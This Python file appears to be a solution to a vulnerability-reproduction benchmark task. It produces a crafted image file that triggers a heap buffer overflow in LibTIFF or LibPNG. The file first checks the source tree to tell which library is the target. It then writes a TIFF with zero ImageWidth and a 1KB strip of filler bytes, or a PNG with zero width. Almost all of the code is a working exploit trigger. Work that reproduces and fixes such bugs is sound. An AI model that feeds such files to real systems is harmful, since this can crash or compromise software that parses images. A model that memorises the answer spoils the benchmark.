import os
import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Args:
            src_path: Path to the vulnerable source code tarball
            
        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # Detection logic to determine if the target is LibTIFF or LibPNG
        # The vulnerability description "zero width or height images are not checked" 
        # is a classic signature for LibTIFF heap overflows (e.g. in tiffcrop).
        is_png = False
        if os.path.exists(src_path):
            for root, dirs, files in os.walk(src_path):
                # Check for PNG headers/source to switch mode if necessary
                if 'png.h' in files or 'libpng' in root.lower():
                    is_png = True
                    break
        
        if is_png:
            return self._generate_png()
        else:
            return self._generate_tiff()

    def _generate_tiff(self) -> bytes:
        # Construct a Malformed TIFF with ImageWidth = 0.
        # This typically causes size calculation (Width * Height * BPP) to be 0,
        # leading to a small allocation. The library then attempts to copy 'StripByteCounts'
        # amount of data into this buffer, causing a Heap Buffer Overflow.
        
        # 1. TIFF Header: Little Endian ('II'), Version 42, IFD Offset 8
        header = struct.pack('<2sHI', b'II', 42, 8)
        
        # 2. Payload Data
        # We need sufficient data to overflow the heap buffer (which is likely 0 or very small).
        # Ground truth length suggests ~2.9KB, we'll use ~1KB which is sufficient for ASAN.
        payload_size = 1024
        payload = b'\x41' * payload_size
        
        # 3. IFD Entries
        # Tags must be in ascending order.
        entries = []
        
        # Tag 256: ImageWidth = 0 (Trigger)
        entries.append((256, 4, 1, 0))
        
        # Tag 257: ImageLength = 10 (Valid height)
        entries.append((257, 4, 1, 10))
        
        # Tag 258: BitsPerSample = 8
        entries.append((258, 3, 1, 8))
        
        # Tag 259: Compression = 1 (No compression)
        entries.append((259, 3, 1, 1))
        
        # Tag 262: PhotometricInterpretation = 1 (BlackIsZero)
        entries.append((262, 3, 1, 1))
        
        # Tag 273: StripOffsets (To be filled)
        entries.append((273, 4, 1, 0))
        
        # Tag 277: SamplesPerPixel = 1
        entries.append((277, 3, 1, 1))
        
        # Tag 278: RowsPerStrip = 10
        entries.append((278, 4, 1, 10))
        
        # Tag 279: StripByteCounts (To be filled)
        entries.append((279, 4, 1, 0))
        
        # 4. Construct IFD
        num_entries = len(entries)
        # Size of IFD: 2 (NumEntries) + 12*N (Entries) + 4 (NextOffset)
        ifd_size = 2 + (num_entries * 12) + 4
        
        # Data follows the IFD
        data_offset = 8 + ifd_size
        
        # Update placeholders
        # StripOffsets (Tag 273) is at index 5
        entries[5] = (273, 4, 1, data_offset)
        # StripByteCounts (Tag 279) is at index 8
        entries[8] = (279, 4, 1, payload_size)
        
        # Pack IFD
        ifd = bytearray()
        ifd.extend(struct.pack('<H', num_entries))
        for tag, typ, count, val in entries:
            # Entry: Tag(2), Type(2), Count(4), Value/Offset(4)
            ifd.extend(struct.pack('<HHII', tag, typ, count, val))
        ifd.extend(struct.pack('<I', 0)) # Next IFD Offset (0 = End)
        
        return header + ifd + payload

    def _generate_png(self) -> bytes:
        # Construct a Malformed PNG with Width = 0
        def chunk(tag, data):
            crc = zlib.crc32(tag + data) & 0xffffffff
            return struct.pack('>I', len(data)) + tag + data + struct.pack('>I', crc)

        sig = b'\x89PNG\r\n\x1a\n'
        
        # IHDR: Width=0, Height=10, BitDepth=8, ColorType=2 (Truecolor)
        ihdr_data = struct.pack('>IIBBBBB', 0, 10, 8, 2, 0, 0, 0)
        ihdr = chunk(b'IHDR', ihdr_data)
        
        # IDAT: Some compressed data
        idat_data = zlib.compress(b'\x00' * 1024)
        idat = chunk(b'IDAT', idat_data)
        
        # IEND
        iend = chunk(b'IEND', b'')
        
        return sig + ihdr + idat + iend